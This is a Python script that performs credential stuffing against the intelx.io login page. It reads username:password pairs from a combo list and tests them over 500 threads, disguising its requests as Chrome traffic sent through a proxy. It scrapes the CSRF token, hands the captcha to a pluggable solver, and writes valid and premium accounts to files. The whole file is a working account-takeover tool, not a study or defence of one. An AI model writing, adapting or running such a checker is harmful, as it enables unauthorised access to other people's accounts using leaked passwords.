import concurrent.futures
from curl_cffi import requests
import concurrent.futures
from colorama import Fore
def between(text, a, b, i=1) -> str:
        return text.split(a)[i].split(b)[0]
class intelx:
    def __init__(self):
        self.session = requests.Session(
            impersonate="chrome",
        )
        self.session.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Prefer': 'safe',
            'Referer': 'https://www.bing.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
            'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        self.prox = "" # proxy here
        self.proxy = {
            "http": self.prox,
            "https": self.prox
        }
        self.session.proxies = self.proxy
    def solve(self, img):
        answer = "Integrate your solving function here " + img
        return answer
    def check(self, username, password):
        r = self.session.get("https://intelx.io/")
        self.session.cookies.update(r.cookies)
        img = between(r.text, '<img src="data:image/jpeg;base64,', '"')
        csrf = between(r.text, 'id="login_form_login_form_csrf_token" type="hidden" value="', '"')
        sol = self.solve(img)
        data = {
            'login_form[login_form_csrf_token]': csrf,
            'login_form[r]': '',
            'login_form[username]': username,
            'login_form[password]': password,
            'login_form[captcha]': sol,
        }
        re = self.session.post('https://intelx.io/login',data=data)
        if "logout" in re.text:
            print(Fore.GREEN + f"[-] Valid account: {username}:{password} " + Fore.RESET)
            with open("valid_accounts.txt", "a") as file:
                file.write(f"{username}:{password}\n")
            self.session.cookies.update(re.cookies)
            rf = self.session.get("https://intelx.io/account")
            plan = between(rf.text, "Your account has the following active licenses assigned:", '<a href="/newsletter" class="btn btn-primary"><')
            if "Free" in plan or "Trial" in plan or "Academia" in plan:
                print(Fore.ORANGE + "Free account" + Fore.RESET)
            else:
                print(Fore.MAGENTA + "Premium account" + Fore.RESET)
                with open("paid_accounts.txt", "a") as file:
                    file.write(f"{username}:{password}\n")
        elif "Login Error: The provided login information is invalid." in re.text:
            print(f'{Fore.RED}[-] Invalid: {username}:{password} {Fore.RESET}')
        elif "Please, correct the code" in re.text:
            print(Fore.ORANGE + "Captcha is incorrect" + Fore.RESET)
        elif "email address" in re.text:
            print(Fore.ORANGE + "Not an email, continueing" + Fore.RESET)
        elif "Text is too short" in re.text:
            print(Fore.ORANGE + "Text to short, continueing" + Fore.RESET)
        elif "Valid password is required" in re.text:
            print(Fore.ORANGE + "Password is none lol, continueing" + Fore.RESET)
        else:
            print(re.text)
if __name__ == "__main__":
    with open('combo.txt', encoding="utf-8") as file:
        accounts=file.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as thread:
        for account in accounts:
            try:
                if ":" in account:
                    user, passw=account.split(':')
            except:
                continue
            thread.submit(intelx().check, user, passw)
